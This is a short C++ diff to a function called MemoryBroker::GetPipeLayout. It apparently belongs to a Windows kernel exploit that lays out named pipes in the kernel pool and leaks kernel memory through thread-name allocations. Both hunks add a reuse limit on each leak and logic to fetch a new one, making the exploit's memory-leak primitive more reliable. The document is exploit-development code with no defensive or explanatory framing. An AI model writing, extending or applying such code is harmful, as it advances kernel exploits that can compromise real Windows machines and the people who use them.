@@ -129,6 +129,11 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
                 BYTE* leakPtr = nameManagerLocked->LeakDataMalloc();
                 if (!leakPtr) {
                     DEBUG_PRINT(" [!] Failed to read leak while looking for IoSB on leak %llu\n", (unsigned long long)iosbLeak);
+                    if (nameManagerLocked->leakUseCount >= THREADNAME_MAX_USES_PER_LEAK) {
+                        DEBUG_PRINT(" [*] ThreadName leak use limit reached; getting a new leak\n");
+                        leakSlotsFilledWithoutIosb = true;
+                        break;
+                    }
                     continue;
                 }
 
@@ -183,6 +188,11 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
                     BYTE* leakPtr = nameManagerLocked->LeakDataMalloc();
                     if (!leakPtr) {
                         DEBUG_PRINT(" [!] Failed to read leak while looking for pipe on leak %llu\n", (unsigned long long)pipeLeak);
+                        if (nameManagerLocked->leakUseCount >= THREADNAME_MAX_USES_PER_LEAK) {
+                            DEBUG_PRINT(" [*] ThreadName leak use limit reached while looking for pipe; getting a new leak\n");
+                            needNewLeak = true;
+                            break;
+                        }
                         continue;
                     }
 
